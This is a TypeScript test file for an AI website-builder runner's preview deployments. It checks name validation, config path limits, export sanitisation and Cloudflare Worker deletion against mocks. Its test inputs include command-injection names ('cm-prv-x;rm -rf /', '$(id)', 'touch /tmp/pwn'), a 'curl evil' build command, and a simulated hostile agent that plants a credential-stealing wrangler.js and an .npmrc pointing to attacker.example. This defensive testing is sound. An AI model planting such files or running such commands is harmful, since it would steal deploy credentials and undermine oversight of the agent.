// Preview deployment safety and lifecycle (AI Website Builder readiness, 2026-10-28). The deploy runs with the
// preview credential, so it must only ever see a clean export of the committed site, never agent-controlled tooling,
// and never a config that reaches outside the project. MOCK: fake control plane, fake Agent SDK, a shell command in
// place of wrangler; no Cloudflare account is touched.
import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, readFileSync, writeFileSync, symlinkSync } from "node:fs";
import path from "node:path";
import { runJob, deletePreview } from "../src/job.ts";
import { sweepPreviews } from "../src/main.ts";
import { ControlPlaneClient } from "../src/control-plane.ts";
import { silentLogger } from "../src/log.ts";
import { previewConfigProblems, previewName, PREVIEW_NAME } from "../src/checks.ts";
import type { SDKMessage } from "@anthropic-ai/claude-agent-sdk";
import {
  startFakeControlPlane, makeJob, claimFrom, fakeSdk, happyAgent, makeSkillsDir, testManifest, makeConfig, SECRET, POLLUTED_ENV, tmp, SDK_OPT_IN,
} from "./helpers.ts";

const manifest = testManifest();

test("[AIB-RUNNER] preview names are per build and safe; config paths outside the project are refused", () => {
  assert.equal(previewName("prj_ABC123", "first_build", 0), "cm-prv-prj-abc123-b0");
  assert.equal(previewName("prj_ABC123", "revision", 3), "cm-prv-prj-abc123-r3");
  assert.notEqual(previewName("prj_x", "revision", 1), previewName("prj_x", "revision", 2), "a revision never reuses a reviewed build's Worker");
  for (const ok of ["cm-prv-prj-abc-b0", "cm-prv-a1-r12"]) assert.ok(PREVIEW_NAME.test(ok), ok);
  for (const bad of ["crestmont-platform", "cm-prv-", "cm-prv-x;rm -rf /", "cm-prv-$(id)", "CM-PRV-X", "production-site"]) assert.equal(PREVIEW_NAME.test(bad), false, bad);

  const dir = tmp("aib-wcfg-");
  const cfg = (body: string) => { writeFileSync(path.join(dir, "wrangler.jsonc"), body); return previewConfigProblems(dir); };
  assert.deepEqual(cfg(`{ "name": "x", "main": "src/worker.js", "assets": { "directory": "./public", "run_worker_first": ["/api/*"] } }`), [], "the starter's shape is fine");
  assert.match(cfg(`{ "assets": { "directory": "../../run/secrets" } }`).join(), /outside the project/);
  assert.match(cfg(`{ "assets": { "directory": "/run/secrets" } }`).join(), /outside the project/);
  assert.match(cfg(`{ "main": "~/x.js" }`).join(), /outside the project/);
  assert.match(cfg(`{ "main": "C:\\\\Users\\\\x.js" }`).join(), /outside the project/);
  assert.match(cfg(`{ "build": { "command": "curl evil" } }`).join(), /custom build command/);
  assert.match(cfg(`{ "routes": [{ "pattern": "crestmont.example/*" }] }`).join(), /routes or custom domains/);
  writeFileSync(path.join(dir, "real.jsonc"), "{}");
  const linkDir = tmp("aib-wcfg-link-");
  symlinkSync(path.join(dir, "real.jsonc"), path.join(linkDir, "wrangler.jsonc"));
  assert.match(previewConfigProblems(linkDir).join(), /symbolic link/);
});

test("[AIB-RUNNER] the preview deploy sees only a clean export of the committed site: no node_modules, .npmrc, .env or .wrangler the agent left behind [mock SDK]", async () => {
  const seen = path.join(tmp("aib-prev-seen-"), "seen.json");
  // Stands in for `npx wrangler deploy`: records the directory it was given and its listing.
  // A constant command; the output path arrives as an environment variable (PREVIEW_DEPLOY_ENV), like a credential.
  const cmd = `node -e "const fs=require('fs');const ls=(d,p='')=>fs.readdirSync(d,{withFileTypes:true}).flatMap(e=>e.isDirectory()?ls(d+'/'+e.name,p+e.name+'/'):[p+e.name]);fs.writeFileSync(process.env.PREVIEW_TEST_SEEN,JSON.stringify({cwd:process.cwd(),files:ls('.')}));console.log('PREVIEW_URL=https://'+process.env.CRESTMONT_PREVIEW_NAME+'.preview.workers.dev')"`;
  const cp = await startFakeControlPlane({ jobs: [makeJob()] });
  const cfg = makeConfig({ controlPlaneUrl: cp.url, skillsSourceDir: makeSkillsDir(manifest), ...SDK_OPT_IN, preview: { command: cmd, envNames: ["PREVIEW_TEST_SEEN"], timeoutMs: 30_000, gateSecret: "preview-gate-secret-for-tests-0123456789" } });
  const client = new ControlPlaneClient({ baseUrl: cp.url, secret: SECRET, runnerId: cfg.runnerId, sleep: async () => {}, retry: { attempts: 2, baseMs: 1 } });
  try {
    const job = await claimFrom(cp);
    const happy = happyAgent();
    const sdk = fakeSdk(async function* (ctx): AsyncGenerator<SDKMessage> {
      yield* happy(ctx);
      if (ctx.prompt.includes("Phase 3 of 3")) {
        const repo = String(ctx.options.cwd);
        // What a hostile or careless agent could leave for `npx wrangler` to load with the preview credential.
        mkdirSync(path.join(repo, "node_modules", "wrangler", "bin"), { recursive: true });
        writeFileSync(path.join(repo, "node_modules", "wrangler", "bin", "wrangler.js"), "steal(process.env)");
        writeFileSync(path.join(repo, ".npmrc"), "registry=https://attacker.example/\n");
        writeFileSync(path.join(repo, ".env.production"), "X=1\n");
        mkdirSync(path.join(repo, "public", "deep", ".wrangler"), { recursive: true });
        writeFileSync(path.join(repo, "public", "deep", ".wrangler", "state"), "x");
        writeFileSync(path.join(repo, ".gitignore"), "# emptied by the agent\n");
      }
    });
    const s = await runJob(job, { cfg, client, queryFn: sdk.queryFn, manifest, logger: silentLogger, heartbeatMs: 25, interruptGraceMs: 200, processEnv: { ...POLLUTED_ENV, PREVIEW_TEST_SEEN: seen } });
    assert.equal(s.outcome, "ready_for_review", String(s.complete?.error));
    const rec = JSON.parse(readFileSync(seen, "utf8")) as { cwd: string; files: string[] };
    assert.notEqual(path.resolve(rec.cwd), path.resolve(path.join(s.workspace!, "repo")), "not the live workspace");
    assert.ok(rec.files.includes("public/index.html") && rec.files.includes("src/worker.js"), "the committed site is there");
    // Founder decision D3: the deployed config is the runner's, with the private-preview gate as entry point.
    assert.ok(rec.files.includes("wrangler.json") && rec.files.includes("__crestmont_preview_gate.mjs") && !rec.files.includes("wrangler.jsonc"), "runner-generated config and gate");
    assert.equal(s.complete?.previewGated, true);
    for (const f of rec.files) assert.doesNotMatch(f, /(^|\/)(node_modules|\.npmrc|\.env\.production|\.wrangler|\.git)(\/|$)/, `stripped: ${f}`);
    assert.ok(!existsSync(rec.cwd), "the export is removed after the deploy");
    assert.equal(s.complete?.previewName, "cm-prv-prj-test1-b0");
  } finally { await cp.close(); }
});

test("[AIB-RUNNER] preview cleanup: the runner deletes only previews the platform lists, with validated names, and reports each result", async () => {
  const log = path.join(tmp("aib-prev-del-"), "deleted.txt");
  const cp = await startFakeControlPlane({ jobs: [] });
  const base = makeConfig({ controlPlaneUrl: cp.url, skillsSourceDir: "x" });
  const cfg = { ...base, preview: { command: "true", envNames: ["CLOUDFLARE_API_TOKEN", "PREVIEW_TEST_LOG"], timeoutMs: 10_000, gateSecret: "preview-gate-secret-for-tests-0123456789" }, previewDelete: { mode: "command" as const, command: `echo "$CRESTMONT_PREVIEW_NAME $CLOUDFLARE_API_TOKEN" >> "$PREVIEW_TEST_LOG"`, timeoutMs: 10_000 } };
  const env = { ...POLLUTED_ENV, PREVIEW_TEST_LOG: log };
  const client = new ControlPlaneClient({ baseUrl: cp.url, secret: SECRET, runnerId: cfg.runnerId, sleep: async () => {}, retry: { attempts: 1, baseMs: 1 } });
  try {
    assert.deepEqual(await deletePreview({ ...cfg, previewDelete: null }, "cm-prv-a-b0"), { ok: false, error: "PREVIEW_DELETE_COMMAND is not configured" });
    assert.match(String((await deletePreview(cfg, "production-site", env)).error), /not a Crestmont preview name/);
    // The fake platform answers 404 for the preview endpoints: an older platform is detected, nothing is deleted.
    assert.equal(await sweepPreviews(cfg, client, silentLogger, env), "unsupported");
  } finally { await cp.close(); }
  // With a platform that lists two previews (one with a hostile name).
  const cp2 = await startFakeControlPlane({ jobs: [], extraRoutes: { "previews/claim": () => ({ previews: [{ jobId: "bld_1", previewName: "cm-prv-prj-a-b0" }, { jobId: "bld_2", previewName: "cm-prv-x;touch /tmp/pwn" }] }), "previews/deleted": () => ({ ok: true }) } });
  const client2 = new ControlPlaneClient({ baseUrl: cp2.url, secret: SECRET, runnerId: cfg.runnerId, sleep: async () => {}, retry: { attempts: 1, baseMs: 1 } });
  try {
    assert.equal(await sweepPreviews({ ...cfg, controlPlaneUrl: cp2.url }, client2, silentLogger, env), 1);
    assert.equal(readFileSync(log, "utf8").trim(), `cm-prv-prj-a-b0 ${POLLUTED_ENV.CLOUDFLARE_API_TOKEN}`, "only the valid name; the credential reaches the delete command");
    const reports = cp2.byPath("previews/deleted").map((r) => r.body);
    assert.deepEqual(reports.map((r) => [r.jobId, r.ok]), [["bld_1", true], ["bld_2", false]]);
    assert.match(String(reports[1].error), /not a Crestmont preview name/);
  } finally { await cp2.close(); }
});

test("[AIB-RUNNER] built-in preview deletion calls the Cloudflare API for that one Worker on the preview account; a missing Worker counts as deleted", async () => {
  const base = makeConfig({ controlPlaneUrl: "http://cp.invalid", skillsSourceDir: "x" });
  const cfg = { ...base, previewDelete: { mode: "cloudflare-api" as const, command: "", timeoutMs: 10_000 } };
  const env = { ...POLLUTED_ENV, CLOUDFLARE_ACCOUNT_ID: "0123456789abcdef0123456789abcdef" };
  const calls: { url: string; method: string; auth: string }[] = [];
  const fake = (status: number, body: unknown) => (async (url: string | URL | Request, init?: RequestInit) => {
    calls.push({ url: String(url), method: String(init?.method), auth: String((init?.headers as Record<string, string>).authorization) });
    return new Response(JSON.stringify(body), { status });
  }) as typeof fetch;
  assert.deepEqual(await deletePreview(cfg, "cm-prv-prj-a-r2", env, fake(200, { success: true, errors: [] })), { ok: true, error: null });
  assert.equal(calls[0].url, "https://api.cloudflare.com/client/v4/accounts/0123456789abcdef0123456789abcdef/workers/scripts/cm-prv-prj-a-r2");
  assert.equal(calls[0].method, "DELETE");
  assert.equal(calls[0].auth, `Bearer ${POLLUTED_ENV.CLOUDFLARE_API_TOKEN}`);
  assert.doesNotMatch(calls[0].url, /force/, "never forces");
  assert.deepEqual(await deletePreview(cfg, "cm-prv-prj-a-r2", env, fake(404, { success: false, errors: [{ code: 10007, message: "not found" }] })), { ok: true, error: null });
  assert.match(String((await deletePreview(cfg, "cm-prv-prj-a-r2", env, fake(403, { success: false, errors: [{ code: 10000, message: "Authentication error" }] }))).error), /Cloudflare API 403: 10000 Authentication error/);
  assert.match(String((await deletePreview(cfg, "cm-prv-prj-a-r2", { ...env, CLOUDFLARE_ACCOUNT_ID: "../../zones" }, fake(200, {}))).error), /32 hex/);
  const n = calls.length;
  assert.match(String((await deletePreview(cfg, "crestmont-platform", env, fake(200, {}))).error), /not a Crestmont preview name/);
  assert.equal(calls.length, n, "no request for a name that is not a preview");
});
